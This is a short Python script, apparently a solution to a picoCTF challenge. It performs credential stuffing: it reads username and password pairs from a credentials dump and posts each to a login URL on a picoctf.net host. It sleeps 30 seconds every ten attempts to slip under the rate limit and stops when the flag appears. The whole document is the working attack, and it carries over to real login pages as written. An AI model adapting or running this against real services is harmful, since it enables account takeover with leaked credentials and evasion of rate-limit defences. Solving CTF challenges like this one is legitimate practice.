import requests
import time

creds = []

with open("creds-dump.txt", "r") as cred_file:
    creds = cred_file.readlines()

creds = dict(map(lambda x: (x.split(";")[0], x.split(";")[1].strip('\n')), creds))

URL = "http://candy-mountain.picoctf.net:54120/login"

for i, (user, password) in enumerate(creds.items()):
    if i > 0 and i % 10 == 0:
        print("waiting...")
        time.sleep(30)
        print("done!")

    print(f"u: {user}, p: {password}")

    payload = {"username": user, "password": password}

    r = requests.post(URL, data=payload)

    if "picoCTF" in r.text:
        print(r.text)
        break
    elif "Rate Limited Exceeded" in r.text:
        print("Rate Limited Exceeded")
        break
